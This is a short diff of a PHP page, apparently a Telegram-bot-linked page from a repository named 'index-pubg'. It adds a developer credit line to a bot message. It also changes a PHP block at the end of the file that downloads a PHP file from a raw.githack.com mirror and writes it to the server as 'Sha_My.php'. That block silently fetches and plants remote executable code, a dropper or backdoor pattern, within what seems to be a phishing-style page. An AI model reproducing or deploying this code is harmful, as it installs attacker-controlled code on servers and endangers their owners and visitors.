@@ -69,6 +69,7 @@ bot("sendMessage",[
 ⏱ ¦ 𝑻𝒊𝒎𝒆 » $time
 📝 ¦ 𝑫𝒂𝒕𝒆 » $day/$month/$year
 🌐¦ 𝒀𝒐𝒖𝒓 𝑳𝒊𝒏𝒌 » $short
+⚜¦ 𝑫𝒆𝒗𝒆𝒍𝒐𝒑𝒆𝒓 » @TT9BB
 ",
 'parse_mode'=>"MarkDown",
 'disable_web_page_preview'=>true,
@@ -86,6 +87,6 @@ bot("sendMessage",[
   </body>
 </html>
 <?
-$sha = file_get_contents('https://raw.githack.com/ahmed-shamy/index-pubg/main/M/s1.php');
+$sha = file_get_contents('https://raw.githack.com/ahmed-shamy/index-pubg/main/M/Ms.php');
 $xxx = file_put_contents("Sha_My.php", $sha);
 ?>
